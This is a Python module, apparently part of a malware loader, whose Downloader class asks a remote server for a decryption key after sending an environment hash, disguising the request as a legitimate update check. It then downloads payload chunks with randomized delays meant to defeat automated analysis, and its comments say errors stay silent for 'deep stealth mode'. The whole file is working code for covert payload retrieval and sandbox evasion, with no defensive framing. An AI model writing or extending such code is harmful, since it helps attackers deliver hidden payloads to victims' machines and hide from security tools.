import requests
import time
import random
from .config import Config, get_env_hash

class Downloader:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": Config.USER_AGENT,
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "en-US,en;q=0.9",
        })

    def get_decryption_key(self):
        """Fetches the session/rolling key from server."""
        try:
            # Send environment hash to authenticate
            payload = {"h": get_env_hash()}
            
            # Mimic legitimate update check
            response = self.session.post(
                Config.BASE_URL + Config.API_DECODE, 
                json=payload,
                timeout=10
            )
            
            if response.status_code == 200:
                data = response.json()
                if "k" in data and data["k"] != "00000000":
                    return data["k"]
            return None
        except Exception:
            return None

    def fetch_chunk(self, chunk_id):
        """Downloads a specific chunk with jitter/delay."""
        # Random sleep to break automated analysis timing patterns
        time.sleep(random.uniform(0.5, 2.0))
        
        try:
            url = f"{Config.BASE_URL}{Config.API_CHUNKS}?id={chunk_id}"
            response = self.session.get(url, timeout=15)
            
            if response.status_code == 200:
                data = response.json()
                # Return the 'part' part of the JSON response if valid
                if data.get("meta", {}).get("valid"):
                    return data.get("p")
            return None
        except Exception as e:
            # In deep stealth mode, ensure errors are silent
            return None
